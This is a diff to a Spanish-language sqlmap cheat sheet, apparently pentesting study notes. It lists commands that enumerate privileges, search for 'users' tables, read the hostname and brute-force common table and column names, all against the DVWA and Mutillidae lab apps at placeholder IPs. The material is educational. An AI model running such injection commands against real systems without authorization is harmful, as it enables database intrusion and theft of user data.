@@ -225,22 +225,38 @@ Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se
 ```
 
 ```bash 
-❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D dvwa --random-agent -p username --privileges 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch -D dvwa --random-agent -p username --privileges 
 	# privileges = Muestra los privilegios de un usuario en el gestor de la DB
 ```
 
 ```bash 
-❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D dvwa --random-agent -p username --search users
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch -D dvwa --random-agent -p username --search users
 	# search = Busca en la DB info especifica relacionada a las tablas o columnas, en este cado 'users'
 	# Opciones:
 		# 1 = Busqueda relacionada a 'users' (Recomendado)
 		# 2 = Busqueda exacta de 'users'
 
-❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D dvwa --random-agent -p username --hostname
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch -D dvwa --random-agent -p username --hostname
 	# hostname = Muestra el nombre del servidor que contiene la app vulnerable 
 ```
 
 ## Fuerza bruta 
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch --random-agent -p username -D dvwa --common-tables 
+	# common-tables = Ataque de fuerza bruta para buscar tablas con un diccionario 
+	# Opciones:
+		# 1 = Diccionario por defaul 
+		# 2 = Diccionario custom y colocar el 'path'
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbms mysql --batch --random-agent -p username -D dvwa -T accounts --common-columns
+	# common-columns = Ataque de fuerza bruta para buscar columnas con un diccionario 
+	# Opciones:
+		# 1 = Diccionario por defaul 
+		# 2 = Diccionario custom y colocar el 'path'
+```
+
+## Anonimato
 
 ```bash 
 
